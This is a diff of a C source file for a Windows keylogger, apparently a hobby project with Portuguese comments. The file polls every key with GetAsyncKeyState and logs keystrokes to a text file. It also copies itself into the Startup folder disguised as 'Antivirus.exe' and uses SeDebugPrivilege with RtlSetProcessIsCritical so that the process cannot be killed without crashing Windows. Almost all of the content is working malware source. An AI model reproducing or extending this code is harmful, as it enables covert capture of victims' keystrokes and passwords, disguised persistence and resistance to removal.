@@ -1,3 +1,7 @@
+#if defined (unix)
+	#error O sistema operacional deve ser Windows
+#endif
+
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
@@ -6,47 +10,43 @@
 #include <string.h>
 #include "include/sendmail.h"
 
-void getWords();
-int fileExists(char *file);
-void hiddenProgram();
-char convertAscii(int codAscii);
+void KeyLogger();
+void MoveProgram();
+char* ConvertToChar(int codAscii);
+BOOL ProtectProcess();
+BOOL EnablePriv (const char *szPriv);
 
 int main(int argc, char* argv[])
 {
 	// ShowWindow(GetForegroundWindow(), SW_HIDE);
-	// hiddenProgram(argv[0]);
+	// MoveProgram();	
+	// ProtectProcess();
 	
+	while(TRUE) {
+		KeyLogger();
+		Sleep(1);
+	}
 	system("pause");
-	// while(1)
-	// {
-	// 	Sleep(1);
-	// 	getWords();
-	// }
 	return 0;
 }
 
-
-void getWords()
+void KeyLogger()
 {	
-	int keyState;
 	FILE *file = NULL;
 	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");
 
 	for(int keyCode=0; keyCode <= 255; keyCode++)
 	{
-		//Verifica o 'status' de uma tecla e guarda na variavel -32767 se ela foi pressionada
-		keyState = GetAsyncKeyState(keyCode);
-		
-		//  GetKeyboardState
+		int keyState = GetAsyncKeyState(keyCode);
 
 		if(keyState == -32767) {			
-			char tec = convertAscii(keyCode);
-			if(tec != 'z'){
-				fprintf(file, "%c", tec);
-				printf("%c", tec);
-			}else{
-				fprintf(file,"%c", keyCode);
-				printf("%c", keyCode);
+			char* tec = ConvertToChar(keyCode);
+			if(tec != ""){
+				fprintf(file, "%s", tec);
+				printf("%s", tec);
+			}else if(tec == ""){
+				// fprintf(file,"%c", keyCode);
+				// printf("%c", keyCode);
 				// printf("%i", keyCode);
 			}
 		}
@@ -54,107 +54,100 @@ void getWords()
 	fclose(file);
 }
 
-void hiddenProgram(char* file)
-{
+void MoveProgram()
+{	
+	FILE *fp;
+
+	char pathToFile[MAX_PATH];
+	HMODULE getMod = GetModuleHandle (NULL);
+	GetModuleFileName (getMod, pathToFile, sizeof(pathToFile));
+
 	char* AllUsersProfile = getenv("allusersprofile");
 	char destino[9999];
 	strcpy(destino, AllUsersProfile);
-	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
-	if(!fileExists(destino)){
-		CopyFile(file,destino,0);
+	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Antivirus.exe");
+	fp = fopen(destino, "r");
+
+	if(!fp){
+		CopyFile(pathToFile, destino, 0);
 	}
+	fclose(fp);
 }
 
-int fileExists(char *file)
+char* ConvertToChar(int codAscii)
 {
-    FILE *fp;
-	fp = fopen(file,"r");
-	if(fp){
-		fclose(fp);
-		return 1;
-	}
-	return 0;
-}
-
-// Função para tratar as teclas não alfa-numericas. (',' , '|', 'ç' , ';'...)
-char convertAscii(int codAscii){
-	char tecla;
+	char* tecla;
 
 	switch(codAscii){
-		case 187: tecla = '='; break;
-		case 188: tecla = ','; break;
-		case 189: tecla = '-'; break;
-		case 190: tecla = '.'; break;
-		case 191: tecla = ';'; break;
-		case 193: tecla = '/'; break;
+		case 16: tecla = ""; break; // Shift
+		case 17: tecla = "[CONTROL]"; break;
+		case 18: tecla = "[ALT]"; break;
+		case 32: tecla = "[SPACE]"; break;
+		case 187: tecla = "="; break;
+		case 188: tecla = ","; break;
+		case 189: tecla = "-"; break;
+		case 190: tecla = "."; break;
+		case 191: tecla = ";"; break;
+		case 193: tecla = "/"; break;
+		case 192: tecla = "'"; break;
+		case 127: tecla = "[DEL]"; break;
+		case 220: tecla = "]"; break;
+		case 221: tecla = "["; break;
+		default: tecla = ""; break;
 	}
 	return tecla;
 }
+ 
+BOOL ProtectProcess() 
+{
+	typedef long ( WINAPI *RtlSetProcessIsCritical ) (
+        IN BOOLEAN    bNew, 
+        OUT BOOLEAN    *pbOld, 
+        IN BOOLEAN    bNeedScb );
 
-// #define FAKE_NAME "\\secure.exe"
-// #define FAKE_KEY "Secure Internet"
+	if (EnablePriv(SE_DEBUG_NAME) != TRUE){
+		printf("Erro em EnablePriv\n"); return FALSE;
+	}
 
-// void regApp () {
-//     char system_ [MAX_PATH];
-//     char pathToFile[MAX_PATH];
-//     HMODULE getMod = GetModuleHandle (NULL);
     
-//     GetModuleFileName (getMod, pathToFile, sizeof(pathToFile));
-//     GetSystemDirectory (system_, sizeof( system_ ));
-    
-//     strcat (system_, FAKE_NAME);
-    
-//     CopyFile (pathToFile, system_, 0);
-    
-//     HKEY key_;
-//     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &key_);
-//     RegSetValueEx(key_, FAKE_KEY, 0, REG_SZ, (const unsigned char *) system_, sizeof(system_));
-//     RegCloseKey(key_);
-// }
+    HANDLE DLL = LoadLibrary("ntdll.dll");
+    if(DLL == NULL){
+		printf("Erro na DLL\n");
+		return FALSE;
+	}
+
+	RtlSetProcessIsCritical setCritical;
+	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
+	
+	if (!setCritical)
+		return FALSE;
+	setCritical(TRUE, NULL, FALSE);
+
+	// SetCriticalProcess(FALSE, NULL, FALSE);
+	return TRUE;
+}
  
-// int protectProcess() {
-//     int enablePriv (const char * szPriv);
-//     HANDLE DLL;
-//     RtlSetProcessIsCritical setCritical;
- 
-//     DLL = LoadLibraryA ("ntdll.dll");
- 
-//     if(DLL == NULL)
-// 		return -1;
- 
-// 	if (enablePriv(SE_DEBUG_NAME) < 0)
-// 		return -1;
- 
-// 	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
-// 	if (!setCritical)
-// 		return -1;
-// 	setCritical(1, 0, 0);
+BOOL EnablePriv (const char *szPriv)
+{
+    HANDLE hToken;
+    LUID luid;
+    TOKEN_PRIVILEGES privs;
+    memset (&privs, 0, sizeof (privs));
 
-// 	return 0;
-// }
- 
-// int enablePriv (const char * szPriv) {
-//     HANDLE token;
-//     LUID luid;
-//     TOKEN_PRIVILEGES privs;
-//     memset (&privs, 0, sizeof (privs));
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
+        return FALSE;
 
-//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) 
-//         return -1;
+    if (!LookupPrivilegeValue(NULL, szPriv, &luid)){
+        CloseHandle (hToken); return FALSE;
+    }
 
+    privs.PrivilegeCount = 1;
+    privs.Privileges[0].Luid = luid;
+    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-//     if (!LookupPrivilegeValue(NULL, szPriv, &luid)){
-//         CloseHandle (token);
-//         return -1;
-//     }
+    BOOL bRet = AdjustTokenPrivileges (hToken, FALSE, &privs, sizeof(privs), NULL, NULL);
+    CloseHandle (hToken);
+    return bRet;
+}
 
-//     privs.PrivilegeCount = 1;
-//     privs.Privileges[0].Luid= luid;
-//     privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-//     if (!AdjustTokenPrivileges (token, FALSE, &privs, sizeof (privs),NULL,NULL)) 
-//         return -1;
-
-//     CloseHandle (token);
-//     return 0;
-// }
+//MessageBox(	NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);
